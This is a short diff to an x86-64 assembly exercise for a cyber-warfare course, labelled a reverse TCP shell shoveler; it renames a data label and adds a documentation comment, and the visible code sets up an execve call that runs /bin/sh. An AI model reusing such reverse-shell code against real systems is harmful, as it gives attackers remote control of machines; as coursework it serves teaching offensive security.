@@ -2,8 +2,9 @@
 ;Christian Sylvester
 ;CS495Z - Cyber Warfare Fundamentals
 ;Pex1 - Reverse TCP Shell Shoveler with x86-64
+;Documentation - Provided resources on Labs and PEx documents
 SECTION .data
-	msg: db "/bin/sh", 0		;path to shell (points to /bin/dash)
+	shell: db "/bin/sh", 0		;path to shell (points to /bin/dash)
 	errExit: db "There was an error.  Please check the debugger.", 10, 0	;Error message for when the socket call fails
 	cleanExit: db "The program exited without error.", 10, 0		;Message to be displayed on clean exit
 
@@ -53,7 +54,7 @@ _start:
 	jl .error			;jumps to error process
 	;Execute the shell
 	mov rax, 59			;execve call code
-	mov rdi, msg			;send /bin/sh
+	mov rdi, shell			;send /bin/sh
 	xor rsi, rsi			;zero out rsi
 	xor rdx, rdx			;zero out rdx
 	syscall 			;sys_execve
